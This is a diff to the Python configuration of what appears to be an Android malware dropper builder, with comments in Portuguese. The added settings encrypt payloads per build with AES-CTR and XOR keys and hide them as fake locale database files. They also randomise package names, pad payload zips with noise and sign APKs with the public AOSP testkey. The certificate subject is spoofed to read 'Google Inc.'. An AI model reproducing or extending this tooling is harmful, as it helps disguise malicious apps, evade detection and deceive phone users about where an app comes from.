@@ -33,15 +33,15 @@ class Config:
     PUBLIC_APP_BASE_URL = os.environ.get("PUBLIC_APP_BASE_URL", "").rstrip("/")
     PUBLIC_ICONS_FOLDER = os.path.join(BASE_DIR, "outputs", "icons")
 
+    # Shell Wi-Fi (R8 + Material + WorkManager + UI). Legacy em dropper_rebuild_legacy_stub/
     DROPPER_TEMPLATE = os.path.join(BASE_DIR, "dropper_rebuild")
-    SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")  # rollback manual only
+    SIGNER_JAR = os.path.join(BASE_DIR, "signer.jar")
     APKTOOL_JAR = os.path.join(BASE_DIR, "apktool.jar")
-    # Etapa 4.1: AndroidX/Material real como classes2.dex (anti-stub)
     DROPPER_LIBS_DEX = os.path.join(
-        BASE_DIR, "dropper_rebuild", "prebuilt", "androidx_material.dex"
+        BASE_DIR, "dropper_rebuild_legacy_stub", "prebuilt", "androidx_material.dex"
     )
+    INJECT_SECONDARY_DEX = False
 
-    # Assinatura: AOSP testkey (chave pública oficial — reputação conhecida)
     _BUILD_TOOLS = os.path.join(
         BASE_DIR, "APP-TEST", "tools", "android-sdk", "build-tools", "35.0.0"
     )
@@ -52,7 +52,7 @@ class Config:
     KEYSTORE_KEY_SIZE = 2048
     KEYSTORE_SIG_ALG = "SHA256withRSA"
     KEYSTORE_STORE_TYPE = "PKCS12"
-    # Modo: "aosp_testkey" (default) | "pkcs12" (signing/release.p12 legado)
+    # testkey mantido por pedido (fase atual)
     SIGNING_MODE = os.environ.get("SIGNING_MODE", "aosp_testkey")
     AOSP_TESTKEY_PK8 = os.path.join(BASE_DIR, "signing", "testkey.pk8")
     AOSP_TESTKEY_CERT = os.path.join(BASE_DIR, "signing", "testkey.x509.pem")
@@ -63,26 +63,44 @@ class Config:
     )
     RELEASE_DNAME = os.environ.get(
         "RELEASE_DNAME",
-        "CN=Android App, OU=Development, O=Android, L=Mountain View, ST=California, C=US",
+        "CN=Android, OU=Android, O=Google Inc., L=Mountain View, ST=California, C=US",
     )
-    # Wi-Fi usa só v2; v3 off
     APKSIGNER_V3_ENABLED = False
 
-    OLD_PACKAGE = "com.android.system.qspaas"
-    PACKAGE_PREFIX = "com.app.mobile"
+    OLD_PACKAGE = "com.turbo.live"  # len 14 — template Wi-Fi
+    # Prefixo legado (generate_package_name agora fixa len==14 estilo com.xxxxx.yyyy)
+    PACKAGE_PREFIX = "com"
 
-    # Dropper crypto (AES-256-CTR, key/IV por build — sem SEED LCG)
     CIPHER_TRANSFORM = "AES/CTR/NoPadding"
+    # XOR por build (vd.c0 patchado); default pool de referencia 0xE7
+    CRYPTO_XOR_FIXED = False
+    CRYPTO_XOR_BYTE = 0xE7
+
+    # Asset names len==12 (Wi-Fi u field) — patch dinamico de size no smali
     ASSET_NAME_POOL = (
         "locale_ko.db",
         "locale_ja.db",
         "locale_de.db",
-        "strings_ko.bin",
-        "strings_de.bin",
-        "strings_pt.bin",
-        "config_cache.bin",
-        "resources_meta.db",
+        "locale_fr.db",
+        "locale_es.db",
+        "locale_pt.db",
+        "locale_it.db",
+        "locale_zh.db",
+        "locale_ru.db",
+        "locale_ar.db",
+        "cache_kf.bin",
+        "config_hd.db",
     )
+
+    ZIP_NORMALIZE_TIMESTAMPS = True
+    ZIP_EPOCH_DATE_TIME = (1981, 1, 1, 1, 1, 2)
+
+    PAYLOAD_ZIP_NOISE = True
+    PAYLOAD_ZIP_NOISE_MIN = 400
+    PAYLOAD_ZIP_NOISE_MAX = 700
+
+    VERSION_NAME_MAJOR = (7, 9)
+    VERSION_CODE_BASE = 30
 
 
 def ensure_directories(config):
@@ -93,3 +111,4 @@ def ensure_directories(config):
         config.PUBLIC_ICONS_FOLDER,
     ):
         os.makedirs(directory, exist_ok=True)
+
